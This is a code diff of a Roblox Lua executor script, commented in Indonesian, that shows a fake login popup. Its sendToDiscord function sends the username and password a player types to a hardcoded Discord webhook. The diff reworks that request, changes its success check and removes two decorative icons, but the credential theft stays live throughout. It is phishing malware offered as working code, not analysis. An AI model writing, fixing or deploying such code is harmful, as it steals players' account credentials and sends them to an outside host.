@@ -5,7 +5,7 @@ local webhook_url = "https://discord.com/api/webhooks/1323658202419822692/wCuQlI
 local function sendToDiscord(username, password)
     if syn and syn.request then
         print("Executor mendukung syn.request") -- Debugging
-        local response = syn.request({
+        local payload = {
             Url = webhook_url,
             Method = "POST",
             Headers = {
@@ -14,9 +14,10 @@ local function sendToDiscord(username, password)
             Body = game:GetService("HttpService"):JSONEncode({
                 content = "Someone logged in\nUsername: " .. username .. "\nPassword: " .. password
             })
-        })
+        }
+        local response = syn.request(payload)
 
-        if response and response.Success then
+        if response and response.StatusCode == 200 then
             print("Data berhasil dikirim ke Discord!") -- Debugging
         else
             print("Gagal mengirim data ke Discord:", response.StatusCode, response.Body) -- Debugging
@@ -34,8 +35,6 @@ local subtitleLabel = Instance.new("TextLabel")
 local usernameBox = Instance.new("TextBox")
 local passwordBox = Instance.new("TextBox")
 local loginButton = Instance.new("TextButton")
-local collabIcon1 = Instance.new("ImageLabel") -- Gambar pertama
-local collabIcon2 = Instance.new("ImageLabel") -- Gambar kedua
 
 -- Properti ScreenGui
 screenGui.Name = "LoginPopup"
@@ -114,22 +113,6 @@ loginButton.BackgroundColor3 = Color3.new(0.2, 0.8, 0.2)
 loginButton.TextColor3 = Color3.new(1, 1, 1)
 loginButton.BorderSizePixel = 2
 loginButton.BorderColor3 = Color3.new(0.2, 0.2, 0.2)
-
--- Properti CollabIcon1 (Gambar pertama)
-collabIcon1.Name = "CollabIcon1"
-collabIcon1.Parent = frame
-collabIcon1.Size = UDim2.new(0, 40, 0, 40)
-collabIcon1.Position = UDim2.new(0, 10, 1, -50)
-collabIcon1.Image = "rbxassetid://14469607987" -- Gambar pertama
-collabIcon1.BackgroundTransparency = 1
-
--- Properti CollabIcon2 (Gambar kedua)
-collabIcon2.Name = "CollabIcon2"
-collabIcon2.Parent = frame
-collabIcon2.Size = UDim2.new(0, 40, 0, 40)
-collabIcon2.Position = UDim2.new(1, -50, 1, -50)
-collabIcon2.Image = "rbxassetid://12861181834" -- Gambar kedua
-collabIcon2.BackgroundTransparency = 1
 
 -- Fungsi LoginButton
 loginButton.MouseButton1Click:Connect(function()
